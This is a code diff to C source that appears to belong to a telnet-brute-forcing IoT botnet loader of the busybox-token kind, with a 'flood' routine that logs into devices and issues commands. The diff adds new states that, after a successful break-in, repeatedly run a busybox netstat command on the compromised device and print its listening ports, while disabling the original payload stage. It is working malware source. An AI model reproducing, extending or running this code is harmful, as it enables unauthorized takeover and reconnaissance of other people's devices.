@@ -21,6 +21,7 @@
 #include <sys/queue.h>
 #include <sys/epoll.h>
 #include <glob.h>
+#include <math.h>
 
 
 #define TOKEN           "/bin/busybox VDOSS"
@@ -460,7 +461,7 @@ void *flood(void *par1)
                         {
                             //REASONABLY sure we got a good login.
                             sockprintf(state->fd, "enable\r\n");
-                            state->state = 6;
+                            state->state = 7;
                             break;
                         }
                     }
@@ -498,13 +499,38 @@ void *flood(void *par1)
                         if (matchPrompt(buf))
                         {
                             sockprintf(state->fd, "%s\r\n", TOKEN);
-                            state->state = 9;
+                            // state->state = 9;
+                            state->state = 200;
                             break;
                         }
                     }
                 }
+                if (state->state == 200)
+                {
+                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
+                    {
+                        if (matchPrompt(buf))
+                        {
+                            sockprintf(state->fd, "/bin/busybox netstat -tuln | grep LISTEN && /bin/busybox VDOSS\r\n");
+                            state->state = 201;
+                            break;
+                        }
+                    }
+                }
+
+                if (state->state == 201)
+                {
+                    while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
+                    {
+                        // report(buf, 48101, "127.0.0.1");
+                        printf("netstat: %s\n", buf);
+                        sleep(10);
+                        sockprintf(state->fd, "/bin/busybox netstat -tuln | grep LISTEN && /bin/busybox VDOSS\r\n");
+                    }
+                }
                 
-                if (state->state == 9)
+                // if (state->state == 9)
+                if (0)
                 {
                     while ((got = log_recv(state->fd, buf, 10240, 0)) > 0)
                     {
